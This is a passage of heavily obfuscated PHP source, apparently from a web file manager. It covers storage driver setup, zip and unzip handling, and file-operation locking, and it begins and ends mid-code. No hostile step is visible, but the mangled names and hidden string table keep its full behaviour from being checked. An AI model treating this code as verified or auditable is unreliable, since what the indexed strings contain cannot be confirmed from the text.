$‡¡¶´„Ö[1203], $‡¡¶´„Ö[6] => $ÍÆĞÃ£); } break; case KodIO::KOD_SHARE_ITEM: $Â”ØŠ”Ë = array($‡¡¶´„Ö[1197] => $‡¡¶´„Ö[1204], $‡¡¶´„Ö[6] => $ÍÆĞÃ£); $×¦—¹Á¨ = Model($‡¡¶´„Ö[630])->getInfo($ÍÆĞÃ£[$‡¡¶´„Ö[437]]); if ($×¦—¹Á¨[$‡¡¶´„Ö[440]] == $‡¡¶´„Ö[208]) { $à–ôûîÛ = KodIO::clear($×¦—¹Á¨[$‡¡¶´„Ö[1202]] . $ÍÆĞÃ£[$‡¡¶´„Ö[1195]]); $ÍÆĞÃ£[$‡¡¶´„Ö[524]] = $×¦—¹Á¨; $ÍÆĞÃ£[$‡¡¶´„Ö[1178]] = $à–ôûîÛ; $Â”ØŠ”Ë = array($‡¡¶´„Ö[1197] => $‡¡¶´„Ö[1205], $‡¡¶´„Ö[6] => $ÍÆĞÃ£); } else { if (!$à–ôûîÛ) { $à–ôûîÛ = $×¦—¹Á¨[$‡¡¶´„Ö[440]]; } } break; default: $à–ôûîÛ = $ÍÆĞÃ£[$‡¡¶´„Ö[94]]; $Â”ØŠ”Ë = array($‡¡¶´„Ö[1197] => $‡¡¶´„Ö[1206]); break; } $Û¤·ëğ = $ÍÆĞÃ£[$‡¡¶´„Ö[94]]; if (!isset(self::$driverCache[$Û¤·ëğ])) { $õòç’ßÏ = strtolower($Â”ØŠ”Ë[$‡¡¶´„Ö[105]]); $¦ª©¶©ó = $GLOBALS[$‡¡¶´„Ö[6]][$‡¡¶´„Ö[99]][$‡¡¶´„Ö[856]]; $Ñ¾‚‡Ï¡ = $‡¡¶´„Ö[84] . (isset($¦ª©¶©ó[$õòç’ßÏ]) ? $¦ª©¶©ó[$õòç’ßÏ] : ucfirst($õòç’ßÏ)); if (!class_exists($Ñ¾‚‡Ï¡)) { show_json("{$Ñ¾‚‡Ï¡}\40\156\x6f\164\x20\145\170\151\163\164\x73\x21", !1); } $†şîƒ‰Ş = isset($Â”ØŠ”Ë[$‡¡¶´„Ö[6]]) ? $Â”ØŠ”Ë[$‡¡¶´„Ö[6]] : !1; self::$driverCache[$Û¤·ëğ] = new $Ñ¾‚‡Ï¡($†şîƒ‰Ş); } $ ³ÖÏÆ = self::$driverCache[$Û¤·ëğ]; $ ³ÖÏÆ->pathDriver = $é¨±Œ«Á; $ ³ÖÏÆ->pathBase = $‡¡¶´„Ö[12]; if (isset($Â”ØŠ”Ë[$‡¡¶´„Ö[6]][$‡¡¶´„Ö[1207]])) { $ ³ÖÏÆ->pathBase = rtrim($Â”ØŠ”Ë[$‡¡¶´„Ö[6]][$‡¡¶´„Ö[1207]], $‡¡¶´„Ö[8]) . $‡¡¶´„Ö[8]; $à–ôûîÛ = $ ³ÖÏÆ->pathBase . ltrim($à–ôûîÛ, $‡¡¶´„Ö[8]); } $à–ôûîÛ = $ ³ÖÏÆ->getPath($à–ôûîÛ); if (isset($ÍÆĞÃ£[$‡¡¶´„Ö[1178]])) { $à–ôûîÛ = $ÍÆĞÃ£[$‡¡¶´„Ö[1178]]; } $ ³ÖÏÆ->path = $à–ôûîÛ; return $ ³ÖÏÆ; } public static function errorTips($İ»†‡é” = false) { $±€ÈÚâÊ =& $_SERVER[¹òÍ›æş]; static $ä ©éüó = array(); $şÒ¿êÊß = 1000; if ($İ»†‡é” === -1) { return $ä ©éüó ? $ä ©éüó[count($ä ©éüó) - 1] : $±€ÈÚâÊ[12]; } if ($İ»†‡é” === !1) { return implode($±€ÈÚâÊ[59], $ä ©éüó); } if (count($ä ©éüó) >= $şÒ¿êÊß) { $ä ©éüó = array_slice($ä ©éüó, $şÒ¿êÊß * 0.5, $şÒ¿êÊß); } $ä ©éüó[] = $İ»†‡é”; write_log($±€ÈÚâÊ[172] . ACTION . $±€ÈÚâÊ[1208] . $İ»†‡é”, $±€ÈÚâÊ[1209]); } public static function getLastError($ï’±×¤ = '') { $™ˆ®÷ÕÂ = self::errorTips(-1); return $™ˆ®÷ÕÂ ? $™ˆ®÷ÕÂ : $ï’±×¤; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ªÎ…Ú±½; if ($ªÎ…Ú±½) { return $ªÎ…Ú±½; } $ã™œ · = IO::init($_SERVER[¹òÍ›æş][8]); return $ã™œ ·; } private static function iconvSystem($¼±²²Õ) { return self::local()->iconvSystem($¼±²²Õ); } private static function iconvApp($·€‚•ª±) { return self::local()->iconvApp($·€‚•ª±); } public static function zipFolder($‘’ÏĞö¼, $‹–ØàËÏ = "\172\x69\160", $ùÄºïÄË = '', $ºÛ™¾õ² = REPEAT_RENAME) { $íÙúÌÑ® =& $_SERVER[¹òÍ›æş]; $”Ã¯î° = IO::listPath($‘’ÏĞö¼); if (!$”Ã¯î°) { return !1; } $”Ã¯î° = array_merge($”Ã¯î°[$íÙúÌÑ®[92]], $”Ã¯î°[$íÙúÌÑ®[93]]); return self::zip($”Ã¯î°, $‹–ØàËÏ, $ùÄºïÄË, $ºÛ™¾õ²); } public static function zip($¬Şıõşü, $åÒÃ°°ë = "\x7a\x69\160", $óÂŞ¶™í = '', $  © ’Ã = REPEAT_RENAME) { $¬½ŒÃî‡ =& $_SERVER[¹òÍ›æş]; if (is_string($¬Şıõşü) && $¬Şıõşü) { $¬Şıõşü = array(array($¬½ŒÃî‡[94] => $¬Şıõşü)); } $Û„Ï—¤¨ = self::init($¬Şıõşü[0][$¬½ŒÃî‡[94]]); $êÁÆÔ˜ = self::info($¬Şıõşü[0][$¬½ŒÃî‡[94]]); $Ú£’Æ€± = $¬½ŒÃî‡[12]; $ÒÊë¨¯ğ = $¬½ŒÃî‡[12]; $ÔÉ£„Ïş = $¬½ŒÃî‡[12]; if ($óÂŞ¶™í && substr($óÂŞ¶™í, -1, 1) != $¬½ŒÃî‡[8]) { $ÒÊë¨¯ğ = get_path_father($óÂŞ¶™í); $ÔÉ£„Ïş = get_path_this($óÂŞ¶™í); } else { $ÒÊë¨¯ğ = self::pathFather($êÁÆÔ˜[$¬½ŒÃî‡[94]]); $ÔÉ£„Ïş = $êÁÆÔ˜[$¬½ŒÃî‡[32]] . $¬½ŒÃî‡[10] . $åÒÃ°°ë; if (count($¬Şıõşü) > 1) { $êÛùòñ» = IO::info($ÒÊë¨¯ğ); $ÔÉ£„Ïş = $êÛùòñ»[$¬½ŒÃî‡[32]] . $¬½ŒÃî‡[10] . $åÒÃ°°ë; } if ($óÂŞ¶™í) { $ÒÊë¨¯ğ = $óÂŞ¶™í; } } if ($Û„Ï—¤¨->getType() == $¬½ŒÃî‡[116]) { $±óî²î = self::init($ÒÊë¨¯ğ); $üïñ¡ÊË = $±óî²î->getType() == $¬½ŒÃî‡[116] ? $ÒÊë¨¯ğ : get_path_father($Û„Ï—¤¨->path); $üïñ¡ÊË = rtrim($üïñ¡ÊË, $¬½ŒÃî‡[8]) . $¬½ŒÃî‡[8]; mk_dir($üïñ¡ÊË); } else { $Ú£’Æ€± = TEMP_FILES . $¬½ŒÃî‡[1210] . time() . rand_string(8) . $¬½ŒÃî‡[8]; mk_dir($Ú£’Æ€±); file_put_contents($Ú£’Æ€± . $¬½ŒÃî‡[1211], $¬½ŒÃî‡[12]); $üïñ¡ÊË = $Ú£’Æ€±; } $…˜³é¯ = IO::info($üïñ¡ÊË); if (!$…˜³é¯ || !$…˜³é¯[$¬½ŒÃî‡[213]]) { show_json(LNG($¬½ŒÃî‡[1212]), !1); } $‰¾¤ÙğĞ = self::zipFileList($¬Şıõşü, $Ú£’Æ€±); foreach ($‰¾¤ÙğĞ as $¡æÖâå½ => $· ÛÆõß) { $‰¾¤ÙğĞ[$¡æÖâå½] = self::iconvSystem($· ÛÆõß); } $èÚ„ƒ‘ = get_filename_auto($üïñ¡ÊË . $ÔÉ£„Ïş, $¬½ŒÃî‡[12], $  © ’Ã); KodArchive::create(self::iconvSystem($èÚ„ƒ‘), $‰¾¤ÙğĞ); if (!IO::exist($èÚ„ƒ‘)) { if ($Ú£’Æ€±) { del_dir($Ú£’Æ€±); } show_json(LNG($¬½ŒÃî‡[1213]), !1); } if (!$Ú£’Æ€±) { return $èÚ„ƒ‘; } $æıàğ²™ = self::move($èÚ„ƒ‘, $ÒÊë¨¯ğ, $  © ’Ã); if ($Ú£’Æ€±) { del_dir($Ú£’Æ€±); } if (!$èÚ„ƒ‘) { show_json(LNG($¬½ŒÃî‡[1213]), !1); } return $æıàğ²™; } public static function unzip($½‹’õ›ó, $›“ô‚É, $ë–ë¥ò = "\55\x31", $ë™ÜòÑì = "\162\145\x70\x6c\141\x63\x65") { $ŠÜèÖê  =& $_SERVER[¹òÍ›æş]; $–Ÿ´³·İ = parent::info($½‹’õ›ó); if (!$–Ÿ´³·İ) { show_json(LNG($ŠÜèÖê [1214]), !1); } $ Ø€ò = IO::infoFull($›“ô‚É); if (!$ Ø€ò) { $›“ô‚É = IO::mkdir($›“ô‚É); } if (isset($ Ø€ò[$ŠÜèÖê [440]]) && trim($ Ø€ò[$ŠÜèÖê [94]], $ŠÜèÖê [8]) != trim($›“ô‚É, $ŠÜèÖê [8])) { $¹€–ó¡” = KodIO::make($ Ø€ò[$ŠÜèÖê [470]]); $™¢ºè = IO::fileNameAuto($¹€–ó¡”, $ Ø€ò[$ŠÜèÖê [32]], REPEAT_RENAME_FOLDER, !0); $›“ô‚É = IO::mkdir($¹€–ó¡” . $™¢ºè); } $ë–ë¥ò = $ë–ë¥ò && $ë–ë¥ò != $ŠÜèÖê [1215] ? @json_decode($ë–ë¥ò, !0) : -1; $¢ºòÑÕ¯ = self::unzipPart($½‹’õ›ó, $ë–ë¥ò); if (!$¢ºòÑÕ¯ || !IO::exist($¢ºòÑÕ¯[$ŠÜèÖê [210]])) { show_json(LNG($ŠÜèÖê [115]), !1); } $ÃÛÊŒö = $¢ºòÑÕ¯[$ŠÜèÖê [1216]][count($¢ºòÑÕ¯[$ŠÜèÖê [1216]]) - 1]; if ($ÃÛÊŒö[$ŠÜèÖê [1217]] == -1 || substr($ÃÛÊŒö[$ŠÜèÖê [32]], -1, 1) == $ŠÜèÖê [8]) { $œşí•¯ê = $¢ºòÑÕ¯[$ŠÜèÖê [1218]] . rand_string(10) . $ŠÜèÖê [8]; mk_dir($œşí•¯ê); $£ƒèŠ = count($¢ºòÑÕ¯[$ŠÜèÖê [1216]]) == 1 ? IO::ext($½‹’õ›ó) : get_path_ext($¢ºòÑÕ¯[$ŠÜèÖê [210]]); $ø¤€¶™ë = KodArchive::extract(self::iconvSystem($¢ºòÑÕ¯[$ŠÜèÖê [210]]), $œşí•¯ê, $ÃÛÊŒö[$ŠÜèÖê [1217]], $™¢ºè, $£ƒèŠ); self::unzipErrorCheck($ø¤€¶™ë, array($ŠÜèÖê [1219], $½‹’õ›ó, $£ƒèŠ, $›“ô‚É, $¢ºòÑÕ¯)); Hook::trigger($ŠÜèÖê [1220], $œşí•¯ê); recursion_dir($œşí•¯ê, $‹¡½ıØ×, $áèô“ÌÎ, 0); $ë¯ÓèöÕ = array_merge($‹¡½ıØ×, $áèô“ÌÎ); $Ó¤¤ô¨½ = array(); foreach ($ë¯ÓèöÕ as $‚ØÏ†ã’) { $òŠƒíıº = IO::move(self::iconvApp($‚ØÏ†ã’), $›“ô‚É, $ë™ÜòÑì); if ($òŠƒíıº) { $Ó¤¤ô¨½[] = $òŠƒíıº; } } del_dir($œşí•¯ê); } else { $òŠƒíıº = IO::move($¢ºòÑÕ¯[$ŠÜèÖê [210]], $›“ô‚É, $ë™ÜòÑì, get_path_this($ÃÛÊŒö[$ŠÜèÖê [32]])); if ($òŠƒíıº) { $Ó¤¤ô¨½[] = $òŠƒíıº; } } return $Ó¤¤ô¨½ ? $Ó¤¤ô¨½ : !1; } public static function unzipList($”òÒŠÔ) { $è´ù×·¡ =& $_SERVER[¹òÍ›æş]; $ùøèèßè = isset($”òÒŠÔ[$è´ù×·¡[1221]]) ? $”òÒŠÔ[$è´ù×·¡[1221]] : !1; $¾øäÍ« = isset($”òÒŠÔ[$è´ù×·¡[1217]]) ? @json_decode($”òÒŠÔ[$è´ù×·¡[1217]], !0) : -1; $Ğê¨½ê¬ = self::unzipPart($”òÒŠÔ[$è´ù×·¡[94]], $¾øäÍ«); if (!$Ğê¨½ê¬ || !IO::exist($Ğê¨½ê¬[$è´ù×·¡[210]])) { show_json(LNG($è´ù×·¡[115]), !1); } $±£‹Ş¡Æ = $Ğê¨½ê¬[$è´ù×·¡[1216]][count($Ğê¨½ê¬[$è´ù×·¡[1216]]) - 1]; $Èò”ª¸º = in_array(IO::ext($Ğê¨½ê¬[$è´ù×·¡[210]]), array($è´ù×·¡[351], $è´ù×·¡[1222], $è´ù×·¡[1223], $è´ù×·¡[1224], $è´ù×·¡[1225], $è´ù×·¡[1226])); if (!$ùøèèßè && ($±£‹Ş¡Æ[$è´ù×·¡[1217]] == -1 || $Èò”ª¸º)) { $ÍÊâ¼Ÿá = $Ğê¨½ê¬[$è´ù×·¡[1218]] . get_path_this($Ğê¨½ê¬[$è´ù×·¡[210]]) . $è´ù×·¡[1227]; if (!IO::exist($ÍÊâ¼Ÿá)) { $«…áÊ¤„ = $±£‹Ş¡Æ[$è´ù×·¡[1217]] == -1 ? get_path_ext(IO::pathThis($”òÒŠÔ[$è´ù×·¡[94]])) : get_path_ext($Ğê¨½ê¬[$è´ù×·¡[210]]); $Õàè•Õ  = KodArchive::listContent(self::iconvSystem($Ğê¨½ê¬[$è´ù×·¡[210]]), !0, $«…áÊ¤„); self::unzipErrorCheck($Õàè•Õ , array($è´ù×·¡[1228], $”òÒŠÔ, $Ğê¨½ê¬)); @file_put_contents($ÍÊâ¼Ÿá, json_encode($Õàè•Õ [$è´ù×·¡[1229]])); } return @json_decode(IO::getContent($ÍÊâ¼Ÿá), !0); } IO::fileOut($Ğê¨½ê¬[$è´ù×·¡[210]], $ùøèèßè, get_path_this($±£‹Ş¡Æ[$è´ù×·¡[32]])); die; } private static function zipFileList($ÒÊ‡«¹¦, $êÖ‚çîà = false) { $äÀ®ö·Î =& $_SERVER[¹òÍ›æş]; $ô¯øÆè = array(); foreach ($ÒÊ‡«¹¦ as $¯üà×½§) { $‹ÔğÀ£µ = $¯üà×½§[$äÀ®ö·Î[94]]; if ($êÖ‚çîà) { $‹ÔğÀ£µ = self::copy($¯üà×½§[$äÀ®ö·Î[94]], $êÖ‚çîà, $äÀ®ö·Î[848]); } else { $ÎÓŠ·Åü = self::init($¯üà×½§[$äÀ®ö·Î[94]]); if ($ÎÓŠ·Åü->getType() == $äÀ®ö·Î[116]) { $‹ÔğÀ£µ = $ÎÓŠ·Åü->path; } } if ($‹ÔğÀ£µ && self::local()->exist($‹ÔğÀ£µ)) { $ô¯øÆè[$¯üà×½§[$äÀ®ö·Î[94]]] = $‹ÔğÀ£µ; } } if (!empty($ô¯øÆè)) { return array_values($ô¯øÆè); } show_json(LNG($äÀ®ö·Î[1192]), !1); } private static function localFilePath($ç”ıİ‰ë) { $úÈ†Ğª£ =& $_SERVER[¹òÍ›æş]; $ÁÏ“Ò…¸ = KodIO::parse($ç”ıİ‰ë); if ($ÁÏ“Ò…¸[$úÈ†Ğª£[33]] == KodIO::KOD_SOURCE) { $Ø¬…àú = Model($úÈ†Ğª£[855])->fileInfoGet(KodIO::sourceID($ç”ıİ‰ë)); if (!$Ø¬…àú[$úÈ†Ğª£[94]]) { show_json($úÈ†Ğª£[1230], !1); } $ç”ıİ‰ë = $Ø¬…àú[$úÈ†Ğª£[94]]; } $·Ñ„ƒóä = self::init($ç”ıİ‰ë); if ($·Ñ„ƒóä->pathParse[$úÈ†Ğª£[1178]]) { $ç”ıİ‰ë = $·Ñ„ƒóä->pathParse[$úÈ†Ğª£[1178]]; $·Ñ„ƒóä = self::init($ç”ıİ‰ë); } $‹ı÷ı×Ù = $·Ñ„ƒóä->getType(); if ($‹ı÷ı×Ù == $úÈ†Ğª£[116] || $‹ı÷ı×Ù == $úÈ†Ğª£[1231]) { if (!$·Ñ„ƒóä->exist($·Ñ„ƒóä->path)) { show_json(LNG($úÈ†Ğª£[115]), !1); } return $·Ñ„ƒóä->path; } return !1; } public static function unzipPart($¼ä¢ÈÁš, $èœ­× = -1) { $ÚÉ¬îøÙ =& $_SERVER[¹òÍ›æş]; $Øø¢—õı = IO::pathThis($¼ä¢ÈÁš); if (!$èœ­× || $èœ­× == -1) { $¿Š©ìÔ¦ = array(array($ÚÉ¬îøÙ[32] => $Øø¢—õı, $ÚÉ¬îøÙ[1217] => -1)); $¿Š©ìÔ¦[0][$ÚÉ¬îøÙ[1232]] = $¿Š©ìÔ¦[0][$ÚÉ¬îøÙ[32]]; } else { if (is_array($èœ­×)) { $¿Š©ìÔ¦ = $èœ­×; $ÙöÏÁÑà = count($¿Š©ìÔ¦) - 1; for ($Ûª“ºë = 0; $Ûª“ºë <= $ÙöÏÁÑà; $Ûª“ºë++) { $å‰Ú÷¢± = $¿Š©ìÔ¦[$Ûª“ºë]; $ÀÔ…ËëÓ = get_path_this($å‰Ú÷¢±[$ÚÉ¬îøÙ[32]]) . (checkExtSafe($å‰Ú÷¢±[$ÚÉ¬îøÙ[32]]) ? $ÚÉ¬îøÙ[12] : $ÚÉ¬îøÙ[1233]); $¿Š©ìÔ¦[$Ûª“ºë][$ÚÉ¬îøÙ[1232]] = $ÚÉ¬îøÙ[1234] . intval($å‰Ú÷¢±[$ÚÉ¬îøÙ[1217]]) . $ÚÉ¬îøÙ[424] . $ÀÔ…ËëÓ; if ($Ûª“ºë == 0) { continue; } $¿Š©ìÔ¦[$Ûª“ºë][$ÚÉ¬îøÙ[1232]] = $¿Š©ìÔ¦[$Ûª“ºë - 1][$ÚÉ¬îøÙ[1232]] . $ÚÉ¬îøÙ[1235] . $¿Š©ìÔ¦[$Ûª“ºë][$ÚÉ¬îøÙ[1232]]; } } } if (!is_array($¿Š©ìÔ¦) || count($¿Š©ìÔ¦) == 0) { return !1; } $ÇŸØüÌĞ = $¿Š©ìÔ¦[count($¿Š©ìÔ¦) - 1]; if (!IO::exist($¼ä¢ÈÁš)) { return !1; } $¶äÌë· = TEMP_FILES . $ÚÉ¬îøÙ[1236] . kodIO::hashPathSafe($¼ä¢ÈÁš) . $ÚÉ¬îøÙ[8]; $€”³•Òê = $¶äÌë· . $ÇŸØüÌĞ[$ÚÉ¬îøÙ[1232]]; mk_dir($¶äÌë·); file_put_contents(TEMP_FILES . $ÚÉ¬îøÙ[1211], $ÚÉ¬îøÙ[12]); if (IO::exist($€”³•Òê)) { return array($ÚÉ¬îøÙ[210] => $€”³•Òê, $ÚÉ¬îøÙ[1216] => $¿Š©ìÔ¦, $ÚÉ¬îøÙ[1218] => $¶äÌë·); } $¾¡Ñ«Ş­ = self::localFilePath($¼ä¢ÈÁš); if (!$¾¡Ñ«Ş­) { $¾¡Ñ«Ş­ = $¶äÌë· . $ÚÉ¬îøÙ[1237]; if (!IO::exist($¾¡Ñ«Ş­)) { self::copy($¼ä¢ÈÁš, $¶äÌë·, !1, get_path_this($¾¡Ñ«Ş­)); } } if (!$¾¡Ñ«Ş­ || !IO::exist($¾¡Ñ«Ş­)) { return !1; } if ($ÇŸØüÌĞ[$ÚÉ¬îøÙ[1217]] == -1) { return array($ÚÉ¬îøÙ[210] => $¾¡Ñ«Ş­, $ÚÉ¬îøÙ[1216] => $¿Š©ìÔ¦, $ÚÉ¬îøÙ[1218] => $¶äÌë·); } $ğ÷ƒµé = $¾¡Ñ«Ş­; foreach ($¿Š©ìÔ¦ as $Ûª“ºë => $å‰Ú÷¢±) { if (!$å‰Ú÷¢± || $å‰Ú÷¢±[$ÚÉ¬îøÙ[1217]] == $ÚÉ¬îøÙ[1215]) { break; } if (substr($å‰Ú÷¢±[$ÚÉ¬îøÙ[32]], -1, 1) == $ÚÉ¬îøÙ[8]) { break; } $’³Ä†½¾ = in_array(get_path_ext($å‰Ú÷¢±[$ÚÉ¬îøÙ[1232]]), array($ÚÉ¬îøÙ[351], $ÚÉ¬îøÙ[1222], $ÚÉ¬îøÙ[1223], $ÚÉ¬îøÙ[1224], $ÚÉ¬îøÙ[1225], $ÚÉ¬îøÙ[1226])); $ıƒ‡é‰º = $Ûª“ºë == count($¿Š©ìÔ¦) - 1 && $’³Ä†½¾; $ãÈÉâØè = $¶äÌë· . $å‰Ú÷¢±[$ÚÉ¬îøÙ[1232]]; $ä¥²ÏÙÇ = $¶äÌë· . get_path_this($å‰Ú÷¢±[$ÚÉ¬îøÙ[32]]); if (IO::exist($ãÈÉâØè)) { $ğ÷ƒµé = $ãÈÉâØè; continue; } $û’èÈ÷– = $Ûª“ºë == 0 ? get_path_ext($Øø¢—õı) : get_path_ext($ğ÷ƒµé); $š¶®æÁ = KodArchive::extract(self::iconvSystem($ğ÷ƒµé), $¶äÌë·, $å‰Ú÷¢±[$ÚÉ¬îøÙ[1217]], $é®ŞÊ­é, $û’èÈ÷–); self::unzipErrorCheck($š¶®æÁ, array($ÚÉ¬îøÙ[1238], $¼ä¢ÈÁš, $¿Š©ìÔ¦, $å‰Ú÷¢±, $ãÈÉâØè)); if (IO::exist($ä¥²ÏÙÇ)) { IO::rename($ä¥²ÏÙÇ, get_path_this($ãÈÉâØè)); } $ğ÷ƒµé = $ãÈÉâØè; } $€”³•Òê = $ğ÷ƒµé; return array($ÚÉ¬îøÙ[210] => $ğ÷ƒµé, $ÚÉ¬îøÙ[1216] => $¿Š©ìÔ¦, $ÚÉ¬îøÙ[1218] => $¶äÌë·); } private static function unzipErrorCheck($Ù´ÃÙ§Ø, $¸àá¢™ù = false) { $è˜¶œÏ =& $_SERVER[¹òÍ›æş]; if ($Ù´ÃÙ§Ø[$è˜¶œÏ[1239]]) { return !0; } write_log(array($è˜¶œÏ[1240], $Ù´ÃÙ§Ø, $¸àá¢™ù), $è˜¶œÏ[1241]); show_json($è˜¶œÏ[1242] . json_encode($Ù´ÃÙ§Ø[$è˜¶œÏ[1229]]), !1); die; } } goto e¢®²È…ª; fÍ·„ØÀˆğ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Òàœé€Á) { $ÂÛËÀ’ç =& $_SERVER[¹òÍ›æş]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÂÛËÀ’ç[584], $Òàœé€Á); $§ş“§ã§ = 1; $this->_lockEvent($Òàœé€Á, array($ÂÛËÀ’ç[585], $ÂÛËÀ’ç[586]), $§ş“§ã§); $this->_lockParent($Òàœé€Á, array($ÂÛËÀ’ç[586]), $§ş“§ã§); $this->_lockEvent($Òàœé€Á, array($ÂÛËÀ’ç[587], $ÂÛËÀ’ç[588]), $§ş“§ã§); $this->_lockCheckEnd($ÂÛËÀ’ç[584], $Òàœé€Á); } public function lockCopyEnd($Âäˆ‰¥„) { $½æÍıÉ£ =& $_SERVER[¹òÍ›æş]; if (!$this->allowLock()) { return; } $›å¯†àí = 0; $this->_lockEvent($Âäˆ‰¥„, array($½æÍıÉ£[585], $½æÍıÉ£[586]), $›å¯†àí); $this->_lockParent($Âäˆ‰¥„, array($½æÍıÉ£[586]), $›å¯†àí); $this->_lockEvent($Âäˆ‰¥„, array($½æÍıÉ£[587], $½æÍıÉ£[588]), $›å¯†àí); } public function lockWriteStart($¦éƒ‘†Û, $§´¾±ªÜ = '') { $Úùç˜» =& $_SERVER[¹òÍ›æş]; if (!$this->allowLock()) { return; } $this->_lockCheck($Úùç˜»[585], $¦éƒ‘†Û); $Øüİò‘Ñ = 1; $this->_lockKey($Úùç˜»[589] . $¦éƒ‘†Û . $Úùç˜»[10] . $§´¾±ªÜ, $Øüİò‘Ñ); $this->_lockEvent($¦éƒ‘†Û, array($Úùç˜»[584], $Úùç˜»[586]), $Øüİò‘Ñ); $this->_lockParent($¦éƒ‘†Û, array($Úùç˜»[584], $Úùç˜»[586]), $Øüİò‘Ñ); $this->_lockCheckEnd($Úùç˜»[585], $¦éƒ‘†Û); } public function lockWriteEnd($ÀØªş¢, $­´şŞÜ¿ = '') { $½¦«™±û =& $_SERVER[¹òÍ›æş]; if (!$this->allowLock()) { return; } $ƒ˜ı¯ì§ = 0; $this->_lockKey($½¦«™±û[589] . $ÀØªş¢ . $½¦«™±û[10] . $­´şŞÜ¿, $ƒ˜ı¯ì§); $this->_lockEvent($ÀØªş¢, array($½¦«™±û[584], $½¦«™±û[586]), $ƒ˜ı¯ì§); $this->_lockParent($ÀØªş¢, array($½¦«™±û[584], $½¦«™±û[586]), $ƒ˜ı¯ì§); } public function lockMoveStart($ôßÚÓÓ‰) { $„ÉØÂÉç =& $_SERVER[¹òÍ›æş]; if (!$this->allowLock()) { return; } $this->_lockCheck($„ÉØÂÉç[586], $ôßÚÓÓ‰); $°¨“¯  = 1; $this->_lockKey($„ÉØÂÉç[590] . $ôßÚÓÓ‰, $°¨“¯ ); $this->_lockEvent($ôßÚÓÓ‰, array($„ÉØÂÉç[584], $„ÉØÂÉç[585]), $°¨“¯ ); $this->_lockParent($ôßÚÓÓ‰, array($„ÉØÂÉç[584], $„ÉØÂÉç[586]), $°¨“¯ ); $this->_lockEvent($ôßÚÓÓ‰, array($„ÉØÂÉç[591], $„ÉØÂÉç[587], $„ÉØÂÉç[588]), $°¨“¯ ); $this->_lockCheckEnd($„ÉØÂÉç[586], $ôßÚÓÓ‰); } public function lockMoveEnd($òú¶–ûÏ) { $Õ²Ü”· =& $_SERVER[¹òÍ›æş]; if (!$this->allowLock()) { return; } $éïşªşî = 0; $this->_lockKey($Õ²Ü”·[590] . $òú¶–ûÏ, $éïşªşî); $this->_lockEvent($òú¶–ûÏ, array($Õ²Ü”·[584], $Õ²Ü”·[585]), $éïşªşî); $this->_lockParent($òú¶–ûÏ, array($Õ²Ü”·[584], $Õ²Ü”·[586]), $éïşªşî); $this->_lockEvent($òú¶–ûÏ, array($Õ²Ü”·[591], $Õ²Ü”·[587], $Õ²Ü”·[588]), $éïşªşî); } private function _lockCheck($‡Ç»í, $——£¿ªĞ) { $¸öñÚıú =& $_SERVER[¹òÍ›æş]; $Ó˜ËÖ¼Ş = $this->sourceInfo($——£¿ªĞ); $†ä½Õ‡ = $‡Ç»í . $¸öñÚıú[10] . $——£¿ªĞ; $this->_lockTimeStart[$†ä½Õ‡] = timeFloat(); if (!is_array($Ó˜ËÖ¼Ş)) { return; } $ùÇ±Ñš¨ = LNG($¸öñÚıú[592]); CacheLock::setErrorMsg($¸öñÚıú[172] . htmlspecialchars($Ó˜ËÖ¼Ş[$¸öñÚıú[32]]) . $¸öñÚıú[174] . $ùÇ±Ñš¨); $this->_lockKey($†ä½Õ‡, 1); $this->_lockKey($†ä½Õ‡, 0); $ĞÊµÉèû = array_reverse($this->parentLevelArray($Ó˜ËÖ¼Ş[$¸öñÚıú[549]])); foreach ($ĞÊµÉèû as $È°Å¬÷¤) { $†ä½Õ‡ = $‡Ç»í . $¸öñÚıú[593] . $È°Å¬÷¤; if (CacheLock::lockGet($¸öñÚıú[594] . $†ä½Õ‡)) { $Ó˜ËÖ¼Ş = $this->sourceInfo($È°Å¬÷¤); CacheLock::setErrorMsg($¸öñÚıú[172] . htmlspecialchars($Ó˜ËÖ¼Ş[$¸öñÚıú[32]]) . $¸öñÚıú[174] . $ùÇ±Ñš¨); $this->_lockKey($†ä½Õ‡, 1); $this->_lockKey($†ä½Õ‡, 0); } } } private function _lockCheckEnd($œ®ûÈì…, $àı•¼ä) { $°÷ø£‹ =& $_SERVER[¹òÍ›æş]; $‘Â¾ƒòæ = $œ®ûÈì… . $°÷ø£‹[10] . $àı•¼ä; CacheLock::setErrorMsg($°÷ø£‹[416]); if (!isset($this->_lockTimeStart[$‘Â¾ƒòæ])) { return; } $æŞ†º = timeFloat() - $this->_lockTimeStart[$‘Â¾ƒòæ]; unset($this->_lockTimeStart[$‘Â¾ƒòæ]); if ($æŞ†º > 0.5) { unset(self::$cacheSourceInfo[$°÷ø£‹[498] . $àı•¼ä]); } $ÅğüÀğÛ = $this->sourceInfo($àı•¼ä); if (!$ÅğüÀğÛ) { show_json(LNG($°÷ø£‹[115]), !1); } } private function _lockParent($ıÉúÕ¼¶, $şÀêòöÇ, $·Êõƒµò) { if (!$this->autoLockSet) { return; } $Ù©¨ô„ = $this->sourceInfo($ıÉúÕ¼¶); if (!is_array($Ù©¨ô„)) { return; } $Áõ§°±ô = array_reverse($this->parentLevelArray($Ù©¨ô„[$_SERVER[¹òÍ›æş][549]])); foreach ($Áõ§°±ô as $–²Î¿Äà) { $this->_lockEvent($–²Î¿Äà, $şÀêòöÇ, $·Êõƒµò); } } private function _lockEvent($ŸÒ §Í¾, $¯ÂŠ°°¡, $¢´¶ë¤) { $»Å»ïú” =& $_SERVER[¹òÍ›æş]; if (!$this->autoLockSet) { return; } foreach ($¯ÂŠ°°¡ as $ŞĞ½¼€ß) { $•¦ìŸğï = $ŞĞ½¼€ß . $»Å»ïú”[10] . $ŸÒ §Í¾; if ($¢´¶ë¤ && CacheLock::lockGet($»Å»ïú”[594] . $•¦ìŸğï)) { continue; } $this->_lockKey($•¦ìŸğï, $¢´¶ë¤); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ï¢”ï“Õ, $‡ßğÆŸı = 1) { $íˆ¢²ö = $_SERVER[¹òÍ›æş][594] . md5($ï¢”ï“Õ); if ($‡ßğÆŸı) { if (isset(self::$_lockItemArr[$íˆ¢²ö])) { return; } self::$_lockItemArr[$íˆ¢²ö] = 1; CacheLock::lock($íˆ¢²ö, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$íˆ¢²ö])) { return; } 